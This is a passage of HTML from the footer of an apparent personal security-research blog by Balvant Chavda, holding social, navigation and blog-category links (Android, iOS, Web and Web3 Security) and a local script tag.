                        <a href="https://discord.com/users/ba1van7" target="_blank" rel="noopener noreferrer" title="Discord"><i class="fab fa-discord"></i></a>
                        <a href="https://app.ens.domains/name/balvant.eth" target="_blank" rel="noopener noreferrer" title="ENS"><i class="fab fa-ethereum"></i></a>
                    </div>
                </div>
                <div class="footer-section">
                    <h3>Quick Links</h3>
                    <ul class="footer-links">
                        <li><a href="../index.html#hero"><i class="fas fa-chevron-right"></i> Home</a></li>
                        <li><a href="../index.html#blog"><i class="fas fa-chevron-right"></i> Blog</a></li>
                        <li><a href="../index.html#cves"><i class="fas fa-bug"></i> CVEs</a></li>
                        <li><a href="../books.html"><i class="fas fa-chevron-right"></i> Books</a></li>
                        <li><a href="../index.html#hall-of-fame"><i class="fas fa-chevron-right"></i> Hall of Fame</a></li>
                        <li><a href="../projects.html"><i class="fas fa-chevron-right"></i> Projects</a></li>
                        <li><a href="../contact.html"><i class="fas fa-chevron-right"></i> Contact</a></li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h3>Categories</h3>
                    <ul class="footer-links">
                        <li><a href="../index.html#blog" class="filter-link" data-filter="android"><i class="fas fa-mobile-alt"></i> Android Security</a></li>
                        <li><a href="../index.html#blog" class="filter-link" data-filter="ios"><i class="fab fa-apple"></i> iOS Security</a></li>
                        <li><a href="../index.html#blog" class="filter-link" data-filter="web"><i class="fas fa-globe"></i> Web Security</a></li>
                        <li><a href="../index.html#blog" class="filter-link" data-filter="web3"><i class="fab fa-ethereum"></i> Web3 Security</a></li>
                        <li><a href="../index.html#blog" class="filter-link" data-filter="philosophy"><i class="fas fa-brain"></i> Philosophy</a></li>
                    </ul>
                </div>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2025 Balvant Chavda. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script src="../js/main.js" defer></script>
</body>
</html> 